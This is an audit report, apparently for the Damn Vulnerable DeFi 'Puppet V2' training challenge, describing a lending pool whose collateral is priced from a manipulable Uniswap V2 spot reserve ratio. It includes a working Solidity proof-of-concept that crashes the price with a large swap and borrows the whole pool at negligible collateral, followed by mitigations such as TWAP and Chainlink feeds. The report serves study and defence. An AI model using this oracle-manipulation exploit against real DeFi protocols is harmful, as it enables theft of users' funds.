---
title: Puppet V2 Audit Report
author: Jack
date: January 13, 2026
header-includes:
  - \usepackage{titling}
  - \usepackage{graphicx}
---


Prepared by: [Jack](https://github.com/Jack-OuCJ)

# Table of Contents
- [Severity Classification](#severity-classification)
- [Summary](#summary)
- [Findings](#findings)
  - [High](#high)

# Severity Classification

| Severity         | Description |
| ---------------- | ----------- |
| ![high]          | A **directly** exploitable security vulnerability that leads to stolen/lost/locked/compromised assets or catastrophic denial of service. |
| ![medium]        | Assets not at direct risk, but the function of the protocol or its availability could be impacted. |
| ![low]           | A violation of common best practices or incorrect usage of primitives, which may not currently have a major impact on security. |
| ![informational] | Non-critical comments, recommendations or potential optimizations, not relevant to security. |

# Summary

| Severity         | Number of issues found |
| ---------------- | ---------------------- |
| ![high]          | 1                      |
| ![medium]        | 0                      |
| ![low]           | 0                      |
| ![informational] | 0                      |
| Total            | 1                      |

# Findings

## High

### [H-1] Uniswap V2 current-reserves price oracle remains manipulable via large swap, enabling undercollateralized borrowing

**Description:** `PuppetV2Pool` upgraded from Uniswap V1 to V2 but retained the same oracle design flaw: the collateral requirement is derived from the live reserve ratio of a single Uniswap V2 pair, not a time-weighted average:

```solidity
function calculateDepositOfWETHRequired(uint256 tokenAmount) public view returns (uint256) {
    uint256 depositFactor = 3;
    return _getOracleQuote(tokenAmount) * depositFactor / 1 ether;
}

function _getOracleQuote(uint256 amount) private view returns (uint256) {
    (uint256 reservesWETH, uint256 reservesToken) =
        UniswapV2Library.getReserves({factory: _uniswapFactory, tokenA: address(_weth), tokenB: address(_token)});

    // ⚠️ Uses current reserve ratio — still a manipulable spot price
    return UniswapV2Library.quote({
        amountA: amount * 10 ** 18,
        reserveA: reservesToken,
        reserveB: reservesWETH
    });
}
```

Although the collateral factor was increased from 2× to 3× and ETH was replaced with WETH, neither change addresses the fundamental problem: an attacker with a large DVT balance can dump tokens into the pool via `swapExactTokensForETH`, sharply lowering the DVT/WETH reserve ratio, and thereafter borrow the pool's entire DVT supply at a fraction of the fair collateral requirement.

**Impact:** An attacker holding sufficient DVT can drain all 1,000,000 DVT from the lending pool. In the challenge, the player holds 10,000 DVT against the pool's initial Uniswap pair of 100 DVT/10 WETH — more than enough to crash the price. The 3× collateral factor provides no meaningful protection against an attacker who can manipulate the price arbitrarily.

**Proof of Concept:**

```solidity
function test_puppetV2() public checkSolvedByPlayer {
    // 1. Approve Uniswap V2 Router to spend player DVT
    token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);

    address[] memory path = new address[](2);
    path[0] = address(token);
    path[1] = address(weth);

    // 2. Dump all DVT — crashes DVT/WETH price in V2 pair
    uniswapV2Router.swapExactTokensForETH({
        amountIn: PLAYER_INITIAL_TOKEN_BALANCE,
        amountOutMin: 0,
        path: path,
        to: player,
        deadline: block.timestamp
    });

    // 3. Wrap all ETH into WETH for use as collateral
    weth.deposit{value: player.balance}();
    weth.approve(address(lendingPool), type(uint256).max);

    // 4. Borrow all pool DVT at artificially low collateral
    uint256 borrowAmount = token.balanceOf(address(lendingPool));
    lendingPool.borrow(borrowAmount);
    token.transfer(recovery, borrowAmount);
}
```

**Recommended Mitigation:**

The core fix is unchanged from V1: replace the spot-price oracle with a manipulation-resistant alternative:

1. **Use Uniswap V2 TWAP** with a sufficiently long observation window (30+ minutes):

   ```solidity
   // Use UniswapV2OracleLibrary.currentCumulativePrices for TWAP
   ```

2. **Use a Chainlink price feed** for DVT/WETH.

3. **Combine multiple sources** via a median, with deviation checks before accepting any single source.

Additionally, ensure the collateral factor is calibrated against the actual market depth, not an arbitrary multiplier, as a 3× factor provides no protection when an attacker can move the price 1000×.

[high]: https://img.shields.io/badge/-High-red "High"
[medium]: https://img.shields.io/badge/-Medium-orange "Medium"
[low]: https://img.shields.io/badge/-Low-yellow "Low"
[informational]: https://img.shields.io/badge/-Informational-blue "Informational"
